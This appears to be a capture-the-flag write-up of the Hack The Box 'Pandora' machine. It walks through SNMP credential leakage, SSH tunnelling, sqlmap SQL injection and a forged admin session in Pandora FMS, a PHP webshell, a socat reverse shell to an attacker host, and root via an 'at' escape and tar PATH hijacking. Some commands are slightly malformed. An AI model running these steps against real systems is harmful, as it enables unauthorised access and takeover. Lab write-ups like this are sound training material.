# Pandora
---
Probably the hardest "easy" box i have done yet. Pandora makes use of a dynamic tunnel via SSH,  which creates a proxy to view the hosted webpage. Pandora let me explore new tools, such as `proxychains`, allowing me to tunnel commands via proxy, and `snmpwalk` for enumerating snmp.

Port 80 is hosting a website called "Play", an extension of `panda.htb`. Lets add this to our hosts file
`echo 10.10.11.136    panda.htb >> /etc/hosts`

After looking through the website, i decided to see if the contact form had any vulnerabilities, but i seemed to hit a dead end so decided to search elsewhere.

With no success with the site on port 80, i decided to also do a UDP scan of the top 20 UDP ports. The scan showed port 161 open with snmp. Lets try and enumerate this further with `nmap -sU -p 161 -sV -sC`

Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```

The host is running SNMPv1, which is the oldest and original version of the SNMP protocol. SNMPv1's biggest flaw is its **use of a clear-text community string**, which can be used to enumerate devices and information that otherwise should be encyrpted. 

From the nmap scan, we can also see the community string `public`, and so we can use this to enumerate further, using snmpwalk.

### SNMP
We can use the following command to enumerate SNMP
`snmpwalk -c public -v1 <IP>`

Where `-c` sets the community string, in this case `public`, and `-v1` sets the version to SNMPv1.

```
iso.3.6.1.2.1.25.4.2.1.5.873 = ""
iso.3.6.1.2.1.25.4.2.1.5.934 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.954 = ""
iso.3.6.1.2.1.25.4.2.1.5.971 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1098 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.27536 = ""
iso.3.6.1.2.1.25.4.2.1.5.33650 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.33652 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.34191 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.34210 = STRING: "-k start"

```
 Near the bottom of the results, we can see what looks like credentials for user `daniel`, with the password `HotelBabylon23`.
 
We can use these to log into the system with SSH, as port 22 is open.

## Foothold
Once SSH'd in daniels account, i looked for the `user.txt` flag, which is in the /matt directory. When attempting to access it, i am denied. Thus i must attempt to pivot into user matt.

```
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
```

### Pivoting
Looking in the /var/www directory, i can see two directories, `html` and `pandora`. html is visible and accessible from a public host, but pandora is not. If i look at the /etc/hosts file on the system, we can see they have it setup this way:

```
daniel@pandora:~$ cat /etc/hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Assuming localhost.localdomain will allow access into the pandora directory, we can setup a dynamic tunnel using SSH.
`ssh -D 9999 daniel@panda.htb`

When can then setup a proxy using FoxyProxy, using SOCKS5, which supports DNS resolution, to resolve the webpage on localhost.localdomain.
![foxyproxy](/assets/img/Icons/Pandora/foxyproxy.png)

From here we are greeted with the following Pandora FMS webpage:

![FMS](/assets/img/Icons/Pandora/fms.png)

Attempting to login with daniels credentials results in an error message saying only `"User can only access API."`
From here i started to do some googling, which lead me to this website:
> https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained


This website details different vulnerabilities with Pandora FMS, but what stood out to me was the unauthenticaed SQL injection associated with `**chart_generator.php**` and `session_id`. I checked whether the chart_generator_php was there, and it was, but the error message "ACCESS IS NOT GRANTED" appeared.

### ProxyChains
Knowing that i can access the vulnerable page, i will using sqlmap via proxychains. ProxyChains is a tool that forces any TCP connection made by any given application to go through proxies. Essentially, you can use ProxyChains to run any program through a proxy server.

First thing is to add the proxy we created to the proxy chains config. `socks5 127.0.0.1 9999 daniel HotelBabylon23`

```
pico /etc/proxychains4.conf

[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
#socks4    127.0.0.1 9050
socks5 127.0.0.1 9999 daniel HotelBabylon23
```

I can now use sqlmap with proxychains on the Pandora FMS.

`proxychains sqlmap -u http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id= --dbs`

</pre>

After enumering through the pandora database, i found 2 interesting tables, `tpassword_history` and `tsessions_php`.

Dumping the password history table gave me the md5 hashed passwords of Matt and Daniel.

Dumping the sessions_php table gave me session id's for both matt and daniel.

![](/assets/img/Icons/Pandora/sessid.png)

Awesome, now i can use Matts session_id cookie and login to his account.

![](/assets/img/Icons/Pandora/mattaccount.png)

Unfortunately, Matt is not an admin. However, using the following SQL injection line from `sqlpwn.py` gave me the admin cookie, to elevate to admin.

```http:///pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO'```

### Webshell
Now i am able to upload files via the admin file manager.
![](/assets/img/Icons/Pandora/fileupload.png)

After trying to upload a php reverse shell and getting no luck, i decided to upload a php webshell.

![](/assets/img/Icons/Pandora/phpwebshell.png)

From here, i attempted to get a reverse shell with socat, which allows full TTY over shells. 
###### Host
`socat file:tty,raw,echo=0 tcp-listen:4445`
######  Web Shell
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>`

We have a reverse shell, nice!

## User
Moving to the matt directory, i can now access the user flag.
<pre>
matt@pandora:/home/matt$ cat user.txt 
*30***b8557f5**be1160c*4be67c***
</pre>

## Priviledge Esculation
After some looking around, i noticed that i was in some sort of restricted environment. When typing `sudo`, i was presented with the following weird error message.
<pre>
matt@pandora:/home/matt$ sudo
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
</pre>

From here, i looked for SUID binaries.
`find / -perm -u=s -type f 2>/dev/null`

<pre>
matt@pandora:/home/matt$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
</pre>

I checked some binaries on GTFObins, and found a possible shell escape using the `/usr/bin/at` binary.

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

Now when typing sudo, i am met with the normal functionality.

Another insteresting binary was  `pandora_backup`. I downloaded it to my host machine, and run `strings` to see if there is any useful information i can see.

```bash
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
```

It looks as though the tar command it used to compress files in the root directory. However i noticed the call to tar does not use the full path, and so i can change to $PATH to a custom tar executable, possibly allowing for priviledge esculation.

```bash
cd /tmp
echo "/bin/bash" > tar
chmod +777 tar
export PATH:/tmp:$PATH
pandora_backup
```

After running, we gained root access and can get the last flag in the root directory.

## Root
